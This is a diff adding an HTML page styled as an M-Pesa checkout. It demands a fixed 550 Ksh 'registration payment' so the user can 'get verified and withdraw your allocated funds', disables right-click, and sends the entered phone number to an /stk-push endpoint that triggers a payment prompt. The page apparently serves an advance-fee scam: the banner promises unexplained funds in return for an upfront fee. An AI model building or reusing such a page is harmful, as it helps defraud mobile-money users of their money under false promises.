@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lipa na Mpesa</title>
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Google Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@500&display=swap" rel="stylesheet">
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+    <style>
+        body {
+            background-color: #005347;
+            font-family: "Rubik", sans-serif;
+        }
+        .card {
+            width: 310px;
+            border: none;
+            border-radius: 15px;
+        }
+        .mpesa {
+            background-color: green !important;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+        }
+        img {
+            border-radius: 15px;
+        }
+
+        /* Spinner */
+        .loading-spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 5px solid lightgray;
+            border-top: 5px solid green;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head> 
+<br>
+<p style="text-align:center; color: white;">COMPLETE YOUR REGISTRATION PAYMENT BELOW TO GET VERIFIED AND WITHDRAW YOUR ALLOCATED FUNDS WITHIN 20 DAYS</p>
+<br>
+<body oncontextmenu="return false">
+    <div class="container d-flex justify-content-center">
+        <div class="card mt-5 px-3 py-4">
+            <div class="d-flex flex-row justify-content-around">
+                <div class="mpesa"><span>Mpesa</span></div>
+            </div>
+            <div class="media mt-4 pl-2">
+                <img src="./images/1200px-M-PESA_LOGO-01.svg.png" class="mr-3" height="75" />
+                <div class="media-body">
+                    <h6 class="mt-1">Enter Phone Number</h6>
+                </div>
+            </div>
+            <div class="media mt-3 pl-2">
+                <form class="row g-3" id="paymentForm">
+                    <!-- Fixed Amount Field -->
+                    <div class="col-12">
+                        <label class="form-label">Amount (Ksh)</label>
+                        <input type="text" class="form-control" name="amount" value="550" readonly>
+                    </div>
+                    
+                    <!-- Phone Number Input -->
+                    <div class="col-12">
+                        <label class="form-label">Phone Number</label>
+                        <input type="text" class="form-control" id="phone" name="phone" placeholder="Enter Phone Number">
+                    </div>
+
+                    <div class="col-12 text-center">
+                        <div id="spinner" class="loading-spinner"></div>
+                        <button type="submit" class="btn btn-success">Pay Now</button>
+                    </div>
+                </form>
+                <p id="responseMessage"></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script>
+        document.getElementById("paymentForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent default form submission
+            
+            let phone = document.getElementById("phone").value;
+            let responseMessage = document.getElementById("responseMessage");
+            let spinner = document.getElementById("spinner");
+
+            // Validate phone number format
+            if (!/^2547\d{8}$/.test(phone)) {
+                alert("Please enter a valid phone number in the format 2547XXXXXXXX.");
+                return false;
+            }
+
+            // Show spinner
+            spinner.style.display = "block";
+
+            // Send phone number to the server for STK push request
+            fetch("/stk-push", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ phone, amount: 550 })
+            })
+            .then(response => response.json())
+            .then(data => {
+                spinner.style.display = "none";
+                if (data.success) {
+                    alert("STK Push sent. Please complete the payment on your phone.");
+                    window.location.href = "countdown.html"; // Redirect to countdown page on success
+                } else {
+                    responseMessage.innerText = data.message;
+                    responseMessage.style.color = "red";
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                spinner.style.display = "none";
+                responseMessage.innerText = "Payment request failed. Try again.";
+                responseMessage.style.color = "red";
+            });
+        });
+    </script>
+</body>
+</html>
